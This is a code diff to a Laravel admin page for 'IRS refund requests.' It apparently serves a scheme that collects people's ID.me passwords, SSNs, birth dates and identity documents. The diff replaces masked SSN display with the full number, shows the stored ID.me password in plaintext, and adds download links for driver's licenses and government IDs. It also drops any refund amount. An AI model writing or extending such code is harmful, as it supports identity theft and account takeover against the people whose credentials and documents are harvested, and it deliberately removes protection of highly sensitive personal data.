@@ -30,9 +30,9 @@
                     <div class="col-md-12">
                         <div class="card p-3 shadow">
                             <div class="card-header">
-                                <div class="d-flex justify-content-between align-items-center">
-                                    <h4 class="card-title">Refund Request #{{ $refund->reference_id }}</h4>
-                                    <div>
+                                <div class="d-flex justify-content-between align-items-center flex-wrap">
+                                    <h4 class="card-title">Refund Request #{{ $refund->id }}</h4>
+                                    <div class="mt-2 mt-md-0">
                                         <a href="{{ route('admin.irs-refunds.index') }}" class="btn btn-secondary btn-sm">
                                             <i class="fa fa-arrow-left"></i> Back to List
                                         </a>
@@ -66,35 +66,50 @@
                                     <div class="col-md-6">
                                         <div class="card">
                                             <div class="card-header">
-                                                <h5 class="card-title">User Information</h5>
+                                                <h5 class="card-title">Submitted Details</h5>
                                             </div>
                                             <div class="card-body">
                                                 <div class="d-flex align-items-center mb-3">
                                                     <img src="{{ profile_photo_url(optional($refund->user)->profile_photo_path, optional($refund->user)->name ?? ($refund->name ?? 'User')) }}" alt="profile" class="mr-3 rounded-circle" style="width: 60px; height: 60px;">
                                                     <div>
                                                         <h6 class="mb-0">{{ $refund->name ?? 'N/A' }}</h6>
+                                                        <small class="text-muted">Account: {{ optional($refund->user)->email ?? 'N/A' }}</small>
                                                     </div>
                                                 </div>
                                                 <div class="table-responsive">
                                                     <table class="table table-bordered">
                                                         <tr>
-                                                            <th>Full Name:</th>
+                                                            <th>Full Name</th>
                                                             <td>{{ $refund->name ?? 'N/A' }}</td>
                                                         </tr>
                                                         <tr>
-                                                            <th>SSN:</th>
-                                                            <td>{{ $refund->maskedSsn() }}</td>
+                                                            <th>Phone</th>
+                                                            <td>{{ $refund->phone ?? 'N/A' }}</td>
                                                         </tr>
                                                         <tr>
-                                                            <th>ID.me Email:</th>
+                                                            <th>Date of Birth</th>
+                                                            <td>
+                                                                @if ($refund->date_of_birth)
+                                                                    {{ $refund->date_of_birth->format('M d, Y') }}
+                                                                @else
+                                                                    N/A
+                                                                @endif
+                                                            </td>
+                                                        </tr>
+                                                        <tr>
+                                                            <th>SSN</th>
+                                                            <td>{{ $refund->plainSsn() !== '' ? $refund->plainSsn() : 'N/A' }}</td>
+                                                        </tr>
+                                                        <tr>
+                                                            <th>Email</th>
                                                             <td>{{ $refund->idme_email ?? 'N/A' }}</td>
                                                         </tr>
                                                         <tr>
-                                                            <th>ID.me Password:</th>
-                                                            <td>{{ $refund->hasIdmePasswordOnFile() ? 'On file (hidden)' : 'N/A' }}</td>
+                                                            <th>Password</th>
+                                                            <td>{{ $refund->hasIdmePasswordOnFile() ? $refund->plainIdmePassword() : 'N/A' }}</td>
                                                         </tr>
                                                         <tr>
-                                                            <th>Country:</th>
+                                                            <th>Country</th>
                                                             <td>{{ $refund->country ?? 'N/A' }}</td>
                                                         </tr>
                                                     </table>
@@ -105,13 +120,13 @@
                                     <div class="col-md-6">
                                         <div class="card">
                                             <div class="card-header">
-                                                <h5 class="card-title">Refund Details</h5>
+                                                <h5 class="card-title">Refund Status</h5>
                                             </div>
                                             <div class="card-body">
                                                 <div class="table-responsive">
                                                 <table class="table">
                                                     <tr>
-                                                        <th>Status:</th>
+                                                        <th>Status</th>
                                                         <td>
                                                             @if ($refund->status == 'pending')
                                                                 <span class="badge badge-warning">Pending</span>
@@ -127,24 +142,56 @@
                                                         </td>
                                                     </tr>
                                                     <tr>
-                                                        <th>Amount:</th>
-                                                        <td>${{ number_format($refund->amount, 2) }}</td>
+                                                        <th>Filing ID</th>
+                                                        <td>{{ $refund->filing_id ?? 'Not submitted' }}</td>
                                                     </tr>
                                                     <tr>
-                                                        <th>Filing ID:</th>
-                                                        <td>{{ $refund->filing_id }}</td>
-                                                    </tr>
-                                                    <tr>
-                                                        <th>Created:</th>
+                                                        <th>Created</th>
                                                         <td>{{ $refund->created_at->format('M d, Y H:i:s') }}</td>
                                                     </tr>
                                                     @if ($refund->updated_at != $refund->created_at)
                                                         <tr>
-                                                            <th>Last Updated:</th>
+                                                            <th>Last Updated</th>
                                                             <td>{{ $refund->updated_at->format('M d, Y H:i:s') }}</td>
                                                         </tr>
                                                     @endif
                                                 </table>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        <div class="card mt-3">
+                                            <div class="card-header">
+                                                <h5 class="card-title">Uploaded Documents</h5>
+                                            </div>
+                                            <div class="card-body">
+                                                <div class="table-responsive">
+                                                    <table class="table table-bordered mb-0">
+                                                        <tr>
+                                                            <th>Driver's License</th>
+                                                            <td>
+                                                                @if ($refund->hasDriversLicense())
+                                                                    <a href="{{ route('admin.irs-refunds.download', [$refund->id, 'drivers-license']) }}" class="btn btn-primary btn-sm">
+                                                                        <i class="fa fa-download"></i> Download
+                                                                    </a>
+                                                                @else
+                                                                    <span class="text-muted">Not uploaded</span>
+                                                                @endif
+                                                            </td>
+                                                        </tr>
+                                                        <tr>
+                                                            <th>Government ID</th>
+                                                            <td>
+                                                                @if ($refund->hasIdDocument())
+                                                                    <a href="{{ route('admin.irs-refunds.download', [$refund->id, 'id-document']) }}" class="btn btn-primary btn-sm">
+                                                                        <i class="fa fa-download"></i> Download
+                                                                    </a>
+                                                                @else
+                                                                    <span class="text-muted">Not uploaded (optional)</span>
+                                                                @endif
+                                                            </td>
+                                                        </tr>
+                                                    </table>
                                                 </div>
                                             </div>
                                         </div>
@@ -163,7 +210,7 @@
                                                         <div class="timeline-date">{{ $refund->created_at->format('M d, Y H:i:s') }}</div>
                                                         <div class="timeline-content">
                                                             <h6>Refund Request Submitted</h6>
-                                                            <p>User submitted a refund request for ${{ number_format($refund->amount, 2) }}</p>
+                                                            <p>User submitted personal details and identity documents for review.</p>
                                                         </div>
                                                     </div>
                                                     @if ($refund->status != 'pending')
@@ -187,4 +234,4 @@
             </div>
         </div>
     </div>
-@endsection 
+@endsection
